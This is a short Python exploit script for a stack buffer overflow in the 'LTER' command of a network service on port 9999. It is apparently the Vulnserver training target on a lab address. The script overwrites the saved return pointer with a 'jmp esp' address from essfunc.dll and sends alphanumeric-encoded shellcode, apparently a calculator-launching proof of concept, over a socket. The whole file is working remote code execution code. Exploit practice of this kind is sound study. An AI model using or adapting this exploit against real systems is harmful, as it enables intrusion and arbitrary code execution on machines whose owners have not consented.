#!/usr/bin/python
import socket,sys,struct

RHOST = "192.168.57.144" # Remote IP
RPORT = 9999 # Remote port

buf_totlen = 3530 # Total length of buffer (payload); 3531 overwrites SEH
offset_srp = 2003

ptr_jmp_esp = 0x62501203 # PTR to "jmp esp" in essfunc.dll

calc =  b""
calc += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
calc += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
calc += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
calc += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
calc += b"\x69\x6c\x38\x68\x4b\x32\x55\x50\x57\x70\x65\x50\x65"
calc += b"\x30\x6c\x49\x39\x75\x66\x51\x6b\x70\x35\x34\x4e\x6b"
calc += b"\x76\x30\x64\x70\x4c\x4b\x56\x32\x46\x6c\x6e\x6b\x70"
calc += b"\x52\x65\x44\x6c\x4b\x54\x32\x37\x58\x56\x6f\x4c\x77"
calc += b"\x71\x5a\x67\x56\x30\x31\x39\x6f\x4c\x6c\x55\x6c\x33"
calc += b"\x51\x31\x6c\x73\x32\x66\x4c\x67\x50\x4f\x31\x68\x4f"
calc += b"\x74\x4d\x67\x71\x39\x57\x39\x72\x6a\x52\x61\x42\x53"
calc += b"\x67\x6c\x4b\x56\x32\x72\x30\x6e\x6b\x50\x4a\x45\x6c"
calc += b"\x6c\x4b\x42\x6c\x57\x61\x52\x58\x39\x73\x62\x68\x37"
calc += b"\x71\x7a\x71\x62\x71\x6c\x4b\x52\x79\x37\x50\x75\x51"
calc += b"\x59\x43\x6e\x6b\x30\x49\x77\x68\x39\x73\x67\x4a\x61"
calc += b"\x59\x4e\x6b\x45\x64\x4e\x6b\x53\x31\x59\x46\x65\x61"
calc += b"\x39\x6f\x6c\x6c\x6a\x61\x4a\x6f\x56\x6d\x35\x51\x69"
calc += b"\x57\x64\x78\x69\x70\x63\x45\x69\x66\x76\x63\x43\x4d"
calc += b"\x78\x78\x45\x6b\x43\x4d\x64\x64\x30\x75\x7a\x44\x31"
calc += b"\x48\x4c\x4b\x43\x68\x45\x74\x43\x31\x68\x53\x33\x56"
calc += b"\x6e\x6b\x36\x6c\x62\x6b\x6c\x4b\x42\x78\x35\x4c\x73"
calc += b"\x31\x68\x53\x6e\x6b\x33\x34\x4c\x4b\x56\x61\x6a\x70"
calc += b"\x6f\x79\x32\x64\x36\x44\x46\x44\x53\x6b\x53\x6b\x61"
calc += b"\x71\x43\x69\x71\x4a\x70\x51\x39\x6f\x79\x70\x73\x6f"
calc += b"\x61\x4f\x32\x7a\x4c\x4b\x72\x32\x68\x6b\x6e\x6d\x73"
calc += b"\x6d\x62\x4a\x36\x61\x4e\x6d\x6f\x75\x6c\x72\x37\x70"
calc += b"\x57\x70\x75\x50\x66\x30\x61\x78\x45\x61\x6e\x6b\x50"
calc += b"\x6f\x6f\x77\x79\x6f\x59\x45\x6f\x4b\x6a\x50\x4d\x65"
calc += b"\x4c\x62\x70\x56\x52\x48\x39\x36\x5a\x35\x6d\x6d\x6f"
calc += b"\x6d\x59\x6f\x79\x45\x37\x4c\x73\x36\x31\x6c\x76\x6a"
calc += b"\x6b\x30\x59\x6b\x79\x70\x32\x55\x66\x65\x4d\x6b\x61"
calc += b"\x57\x74\x53\x74\x32\x32\x4f\x62\x4a\x37\x70\x72\x73"
calc += b"\x39\x6f\x4b\x65\x30\x63\x63\x51\x42\x4c\x51\x73\x64"
calc += b"\x6e\x35\x35\x62\x58\x75\x35\x63\x30\x41\x41"

buf = ""
buf += "\x41" * (offset_srp - len(buf))
buf += struct.pack("<I", ptr_jmp_esp) # SRP
buf += calc
buf += "\x43" * (buf_totlen - len(buf)) # Fills rest of buffer with 'B'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

s.send("LTER /.:/" + buf)
s.close()

